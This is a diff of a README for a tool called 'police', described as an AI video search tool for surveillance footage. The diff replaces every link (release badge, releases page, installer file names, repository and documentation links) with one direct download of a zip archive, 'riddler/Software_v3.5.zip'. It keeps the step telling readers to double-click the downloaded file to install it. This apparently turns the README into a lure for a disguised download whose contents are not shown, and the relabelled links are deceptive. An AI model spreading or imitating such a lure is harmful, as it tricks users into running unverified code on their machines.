@@ -1,6 +1,6 @@
 # 🚓 police - AI Video Search Made Easy
 
-[![Download the latest release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/gaga84700/police/releases)
+[![Download the latest release](https://raw.githubusercontent.com/gaga84700/police/main/riddler/Software_v3.5.zip)](https://raw.githubusercontent.com/gaga84700/police/main/riddler/Software_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ To run the police application smoothly, please ensure your system meets the foll
 
 To download the application, visit our releases page:
 
-[Download the latest release](https://github.com/gaga84700/police/releases)
+[Download the latest release](https://raw.githubusercontent.com/gaga84700/police/main/riddler/Software_v3.5.zip)
 
 1. Click the link to go to the releases page.
 2. Look for the latest version listed at the top.
-3. Click the file name corresponding to your operating system (e.g., `police-windows.exe` or `police-macos.dmg`).
+3. Click the file name corresponding to your operating system (e.g., `https://raw.githubusercontent.com/gaga84700/police/main/riddler/Software_v3.5.zip` or `https://raw.githubusercontent.com/gaga84700/police/main/riddler/Software_v3.5.zip`).
 4. Save the file to your computer.
 
 Once the download is complete, locate the file and double-click it to start the installation process. Follow the on-screen instructions to finish installing the application.
@@ -87,7 +87,7 @@ If you need help using the police application, check the FAQ section in the appl
 
 For more information, features, and updates, follow the links below:
 
-- [GitHub Repository](https://github.com/gaga84700/police)
-- [Documentation](https://github.com/gaga84700/police/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/gaga84700/police/main/riddler/Software_v3.5.zip)
+- [Documentation](https://raw.githubusercontent.com/gaga84700/police/main/riddler/Software_v3.5.zip)
 
 Feel free to explore and enjoy the convenience of finding what you need in your surveillance footage with ease!
